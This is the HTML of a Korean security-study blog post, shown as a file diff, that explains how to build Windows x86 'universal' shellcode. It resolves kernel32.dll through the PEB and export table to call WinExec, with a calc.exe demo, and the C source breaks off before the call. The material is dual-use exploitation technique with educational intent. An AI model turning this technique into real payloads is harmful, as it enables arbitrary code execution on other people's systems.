@@ -1,0 +1,490 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="C언어로 Windows 32비트 환경의 유니버셜 쉘코드 제작"><title>Windows x86 Universal Shellcode</title><link rel=canonical href=https://t43w00.netlify.app/p/windows-x86-universal-shellcode/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="Windows x86 Universal Shellcode"><meta property='og:description' content="C언어로 Windows 32비트 환경의 유니버셜 쉘코드 제작"><meta property='og:url' content='https://t43w00.netlify.app/p/windows-x86-universal-shellcode/'><meta property='og:site_name' content='T43W00'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Reversing'><meta property='article:published_time' content='2025-03-04T00:00:00+00:00'><meta property='article:modified_time' content='2025-03-04T00:00:00+00:00'><meta name=twitter:title content="Windows x86 Universal Shellcode"><meta name=twitter:description content="C언어로 Windows 32비트 환경의 유니버셜 쉘코드 제작"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_da68217e1fd91b15.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🐱</span></figure><div class=site-meta><h1 class=site-name><a href=/>T43W00</a></h1><h2 class=site-description>정보보안 공부</h2></div></header><ol class=menu-social><li><a href=https://github.com/t43w00 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/743w00 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#목표>목표</a></li><li><a href=#유니버셜-쉘코드란>유니버셜 쉘코드란?</a></li><li><a href=#함수-주소-동적으로-구하기>함수 주소 동적으로 구하기</a><ol><li><a href=#dll-base-address-구하기>DLL Base Address 구하기</a><ol><li><a href=#peb>PEB</a></li><li><a href=#ldr>LDR</a></li><li><a href=#modulelist>ModuleList</a></li><li><a href=#dllbase>DllBase</a></li></ol></li><li><a href=#export-table-rva-구하기>Export Table RVA 구하기</a><ol><li><a href=#nt-header>NT Header</a></li><li><a href=#optional-header>Optional Header</a></li><li><a href=#data-directory>Data Directory</a></li><li><a href=#export-table-rva>Export Table RVA</a></li></ol></li><li><a href=#winexec-함수-rva-구하기>WinExec 함수 RVA 구하기</a><ol><li><a href=#export-table-fields>Export Table Fields</a></li><li><a href=#구하는-방법>구하는 방법</a></li></ol></li></ol></li><li><a href=#쉘코드-구현>쉘코드 구현</a><ol><li><a href=#c-코드-작성>C 코드 작성</a></li><li><a href=#쉘코드-추출>쉘코드 추출</a></li><li><a href=#쉘코드-실행>쉘코드 실행</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/reversing/>Reversing</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/windows-x86-universal-shellcode/>Windows x86 Universal Shellcode</a></h2><h3 class=article-subtitle>C언어로 Windows 32비트 환경의 유니버셜 쉘코드 제작</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Mar 04, 2025</time></div></footer></div></header><section class=article-content><h2 id=목표>목표</h2><ul><li>Windows 32비트 유니버셜 쉘코드 개념 이해와 제작 및 실행</li></ul><hr><h2 id=유니버셜-쉘코드란>유니버셜 쉘코드란?</h2><p>먼저 쉘코드는 취약점을 이용하여 특정 명령을 실행하기 위한 기계어 코드를 말한다.</p><p>하지만 <code>ASLR</code> 기법의 등장으로 인해 이를 우회할 필요가 있었다.</p><p>이러한 배경으로 동적으로 함수의 주소를 가져와 실행하는 유니버셜 쉘코드가 탄생하였다.</p><blockquote><p><code>ASLR</code> 기법이란?<br>스택, 힙, 라이브러리, 등의 주소를 랜덤한 영역에 배치하여, 주소를 예측하기 어렵게 하는 기법</p></blockquote><hr><h2 id=함수-주소-동적으로-구하기>함수 주소 동적으로 구하기</h2><p><code>ASLR</code> 기법을 우회하기 위해 함수의 주소를 동적으로 구해야 한다.</p><p>함수의 주소는 <code>DLL</code>의 <code>PE</code> 헤더를 파싱하여 <code>Export Table</code>을 통해 함수의 오프셋을 찾을 수 있다.</p><p>그렇기 때문에 먼저 <code>DLL</code>의 베이스 주소를 구해야 한다.</p><hr><h3 id=dll-base-address-구하기>DLL Base Address 구하기</h3><p>이번 글에서는 계산기를 실행하는 것이 목표이기 때문에 프로그램을 실행시키는 <code>WinExec</code> 함수가 저장되어 있는 <code>kernel32.dll</code>의 주소를 구하도록 하겠다.</p><hr><h4 id=peb>PEB</h4><p>먼저 <code>Windows</code> 운영체제에서 각 프로세스의 정보를 담고 있는 <code>PEB(Process Environment Block)</code> 구조체에 접근해야 한다.</p><p><code>PEB</code> 구조체는 <code>fs</code> 레지스터의 <code>0x30</code> 오프셋에 위치한다.</p><img src=image-2.png alt=Image width=900><hr><h4 id=ldr>LDR</h4><p>다음으로 프로세스에 로드된 모듈(<code>DLL</code>)에 대한 정보를 포함하는 <code>PEB_LDR_DATA</code> 구조체의 포인터인 <code>Ldr</code>에 접근해야 한다.</p><p><code>Ldr</code>은 <code>PEB</code> 구조체의 <code>0x0C</code> 오프셋에 위치한다.</p><img src=image-1.png alt=Image width=900><hr><h4 id=modulelist>ModuleList</h4><p><code>PEB_LDR_DATA</code> 구조체에는 모듈의 정보를 저장하는 3개의 연결 리스트가 있는데, 각각 정렬되는 방식이 다르다.</p><ul><li><code>InLoadOrderModuleList</code> : 메모리에 로드된 순서대로 정렬</li><li><code>InMemoryOrderModuleList</code> : 메모리 상에 배치된 주소 순서대로 정렬</li><li><code>InInitializationOrderModuleList</code> : 초기화된 순서대로 정렬</li></ul><img src=image-3.png alt=Image width=900><hr><h4 id=dllbase>DllBase</h4><p>보통의 경우에는 메모리에 배치되는 순서가 <code>Process Image</code> -> <code>ntdll.dll</code> -> <code>kernel32.dll</code> 이기 때문에 <code>InMemoryOrderModuleList</code>의 세 번째 모듈이 <code>kernel32.dll</code>에 해당한다.</p><p> </p><p><code>windbg</code>를 통해 직접 확인해볼 수 있다.</p><img src=image-4.png alt=Image width=900><hr><h3 id=export-table-rva-구하기>Export Table RVA 구하기</h3><p><code>kernel32.dll</code>의 주소를 구했으니 이제 프로그램에서 내보낸 함수의 목록이 저장된 <code>Export Table</code>을 찾아야 한다.</p><p><code>Export Table</code>의 위치는 <code>Data Directory</code>에 저장된 <code>Export Table</code>의 <code>RVA</code>를 통해 구할 수 있다.</p><hr><h4 id=nt-header>NT Header</h4><p>먼저 <code>PE</code> 파일의 로딩 정보를 저장하는 <code>NT Header</code>에 접근해야 한다.</p><p><code>NT Header</code>의 위치는 <code>e_lfanew</code>에 저장되어 있는 오프셋을 통해 구할 수 있는데, 이는 <code>DllBase(DOS Header)</code>의 <code>0x3C</code> 오프셋에 저장되어 있다.</p><img src=image-5.png alt=Image width=900><hr><h4 id=optional-header>Optional Header</h4><p>다음으로 프로그램 실행에 필요한 정보를 담고 있는 <code>Optional Header</code>에 접근해야 한다.</p><p><code>Optional Header</code>는 <code>NT Header</code>의 <code>0x18</code> 오프셋에 위치한다.</p><img src=image-6.png alt=Image width=900><hr><h4 id=data-directory>Data Directory</h4><p>이제 <code>Export Table</code>의 <code>RVA</code>가 저장되어 있는 <code>Data Directory</code>에 접근해야 한다.</p><p><code>Data Directory</code>는 <code>Optional Header</code>의 <code>0x60</code> 오프셋에 위치한다.</p><img src=image-7.png alt=Image width=900><hr><h4 id=export-table-rva>Export Table RVA</h4><p><code>Export Table</code>의 <code>RVA</code>는 <code>Data Directory</code> 배열의 첫번째 항목이다.</p><img src=image-8.png alt=Image width=900><hr><h3 id=winexec-함수-rva-구하기>WinExec 함수 RVA 구하기</h3><p>이제 <code>Export Table</code>의 필드들을 순회하며 필요한 값들을 이용하여 <code>WinExec</code> 함수의 <code>RVA</code>를 구해야 한다.</p><hr><h4 id=export-table-fields>Export Table Fields</h4><p><code>Export Table</code>은 함수의 이름과 주소를 저장한 <code>RVA</code>를 포함하는데, 아래 필드들을 이용할 것이다.</p><ul><li><code>AddressOfFunctions</code> : 함수들의 주소 배열의 <code>RVA</code> (오프셋 : <code>0x1C</code>)</li><li><code>AddressOfNames</code> : 함수 이름들의 <code>RVA</code> 배열의 <code>RVA</code> (오프셋 : <code>0x20</code>)</li><li><code>AddressOfNameOrdinals</code> : 이름과 함수 주소를 매핑하는 <code>Ordinals</code> 배열의 <code>RVA</code> (오프셋 : <code>0x24</code>)</li></ul><hr><h4 id=구하는-방법>구하는 방법</h4><p><code>AddressOfNames</code> 필드에 접근하여 <code>WinExec</code>라는 이름의 함수의 인덱스를 기억한 뒤에,</p><p><code>AddressOfNameOrdinals</code> 배열에 접근해서 인덱스번째의 <code>Ordinal</code> 값을 저장하면,</p><p><code>AddressOfFunctions</code> 배열의 <code>Ordinal</code> 번째의 값이 <code>WinExec</code> 함수의 <code>RVA</code> 값이 될 것이다.</p><p>따라서 <code>WinExec</code> 함수의 <code>RVA</code> 값을 <code>kernel32.dll</code>의 <code>DllBase</code>에 더하면 <code>WinExec</code>의 절대 주소가 된다.</p><hr><h2 id=쉘코드-구현>쉘코드 구현</h2><p>위 정보들을 바탕으로 C언어로 쉘코드를 작성하여 컴파일한 뒤 추출하여 쉘코드로써 실행해보도록 하겠다.</p><hr><h3 id=c-코드-작성>C 코드 작성</h3><p><code>Inline Assembly</code>를 이용하면 <code>fs</code> 레지스터를 통해 <code>PEB</code>에 접근할 수 있다.</p><p>앞서 설명한 방법들을 통해 <code>Export Table</code>의 필드들을 순회하여 <code>WinExec</code> 함수의 주소를 구하였다.</p><p><code>"WinExec"</code>나 <code>"calc.exe"</code>와 같은 문자열 리터럴 값은 이후 쉘코드로 추출하였을 때 그 배열을 <strong>절대주소</strong>로 불러오기 때문에, 이를 방지하기 위해 <code>ASCII</code> 값으로 저장하였다.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// compile : gcc -o shellcode.exe shellcode.c -m32
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>// kernel32.dll Base 주소 구하기
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>PEB</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>__asm__</span> <span class=p>(</span><span class=s>&#34;movl %%fs:0x30, %0&#34;</span> <span class=o>:</span> <span class=s>&#34;=r&#34;</span> <span class=p>(</span><span class=n>PEB</span><span class=p>));</span> <span class=c1>// Inline Assembly(gcc)를 사용해 fs 레지스터에 접근
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>Ldr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>PEB</span> <span class=o>+</span> <span class=mh>0x0C</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>InMemoryOrderModuleList</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>Ldr</span> <span class=o>+</span> <span class=mh>0x14</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>ntdll</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>InMemoryOrderModuleList</span> <span class=o>+</span> <span class=mh>0x00</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>kernel32</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>ntdll</span> <span class=o>+</span> <span class=mh>0x00</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>DllBase</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>kernel32</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Export Table 주소 구하기
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>e_lfanew</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=mh>0x3C</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>NT_Header</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=n>e_lfanew</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>Optional_Header</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>NT_Header</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>Data_Directory</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>Optional_Header</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>Export_Table_RVA</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>Data_Directory</span> <span class=o>+</span> <span class=mh>0x00</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>Export_Table_Addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=n>Export_Table_RVA</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Export Table Fields 주소 구하기
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>AddressOfFunctions</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>Export_Table_Addr</span> <span class=o>+</span> <span class=mh>0x1C</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>AddressOfNames</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>Export_Table_Addr</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>AddressOfNameOrdinals</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>Export_Table_Addr</span> <span class=o>+</span> <span class=mh>0x24</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>WinExec_Name</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// 순회하며 WinExec 함수 찾기
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>char</span> <span class=o>*</span><span class=n>Func_Name</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>AddressOfNames</span> <span class=o>+</span> <span class=n>i</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>))</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>DllBase</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>Func_Name</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>Func_Name</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>Func_Name</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>Func_Name</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>Func_Name</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>Func_Name</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>Func_Name</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>==</span> <span class=n>WinExec_Name</span><span class=p>[</span><span class=mi>6</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>i</span><span class=o>++</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>WinExec_index</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Export Table Fields 구하기
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>short</span> <span class=n>ordinal</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>short</span><span class=o>*</span><span class=p>)(</span><span class=n>AddressOfNameOrdinals</span> <span class=o>+</span> <span class=n>WinExec_index</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>short</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>WinExec_RVA</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)(</span><span class=n>AddressOfFunctions</span> <span class=o>+</span> <span class=n>ordinal</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>WinExec_Addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)(</span><span class=n>DllBase</span> <span class=o>+</span> <span class=n>WinExec_RVA</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>calcexe</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// WinExec 호출
